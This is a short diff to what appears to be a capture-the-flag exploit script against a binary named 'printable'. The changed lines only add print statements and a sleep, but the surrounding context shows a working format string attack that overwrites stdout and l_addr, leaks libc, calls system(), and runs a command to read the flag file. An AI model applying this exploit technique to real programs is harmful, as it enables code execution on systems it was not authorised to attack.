@@ -82,7 +82,7 @@ def fmtstr_byte(offset, writes, written=0):
 attempt = 0
 while True:
     attempt += 1
-    print("----------> Attempt", attempt)
+    print("\n----------> Attempt", attempt)
     p = conn()
 
     bss = 0x601000
@@ -102,6 +102,7 @@ while True:
 
     0x400925 -> bss, ret2main when exit()
     '''
+    print("Overwriting stdout and l_addr")
     k = 13
     pl = f'%{0x40}c%{k}$hn'
     pl += f'%{k+1}$hhn'
@@ -128,6 +129,7 @@ while True:
     if len(r) < 1 or b'Segmentation fault' in r:
         print("Fail attempt, sigsegv")
         p.close()
+        sleep(0.5)
         continue
     
     idx = r.index(b'libc-') + 5
@@ -180,7 +182,7 @@ while True:
     rr(p, 1)
     print("Success, calling system()")
 
-    print("Write flags to stderr:")
+    print("Write flags to stderr")
     sl(p, b'cat /home/printable/printable_fl4g >&2')
     print(ra(p, 2).decode())
 
